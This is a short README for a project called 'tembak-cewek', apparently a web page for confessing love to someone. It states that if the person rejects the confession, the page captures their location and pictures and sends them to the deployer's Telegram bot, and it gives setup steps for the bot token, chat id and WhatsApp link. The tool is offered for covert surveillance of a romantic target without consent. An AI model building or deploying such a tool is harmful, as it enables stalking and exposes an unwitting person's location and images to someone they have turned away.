# tembak-cewek
Tool for express your love to girlfriend or boyfriend, but if they reject your love, you will get their location and pictures on your telegram bot. 

## Preparing Telegram Bot
1. Go to your telegram
2. Search @Botfather
3. Create a chatbot for get token api telegram
4. For find your chat id you can visit
```
https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
```
5. Change
```
const telegramBotToken = 'your_token_bot';
const chatId = 'your_chat_id';
const whatsappUrl = `https://wa.me/your_wa_number?text=${message}`;
```
6. Deploy your project
